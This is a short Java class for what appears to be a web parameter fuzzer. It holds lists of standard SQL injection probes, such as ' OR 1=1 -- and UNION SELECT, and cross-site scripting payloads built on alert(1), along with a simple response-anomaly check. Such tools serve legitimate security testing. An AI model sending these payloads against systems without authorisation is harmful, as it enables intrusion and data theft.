package com.example.paramfuzzer;

import java.util.List;
import java.util.ArrayList;

public class FuzzingLogic {
    private final List<String> sqliPayloads = List.of(
        "' OR 1=1 --",
        "\" OR 1=1 --",
        "admin'--",
        "' UNION SELECT NULL, NULL --"
    );

    private final List<String> xssPayloads = List.of(
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>"
    );

    public List<String> getAllPayloads() {
        List<String> all = new ArrayList<>();
        all.addAll(sqliPayloads);
        all.addAll(xssPayloads);
        return all;
    }

    public boolean isAnomaly(int originalStatus, int originalLength, int fuzzedStatus, int fuzzedLength) {
        // Simple anomaly detection: status code change or significant length change (>10%)
        if (originalStatus != fuzzedStatus) {
            return true;
        }
        double diff = Math.abs(originalLength - fuzzedLength);
        return diff > (originalLength * 0.1);
    }
}
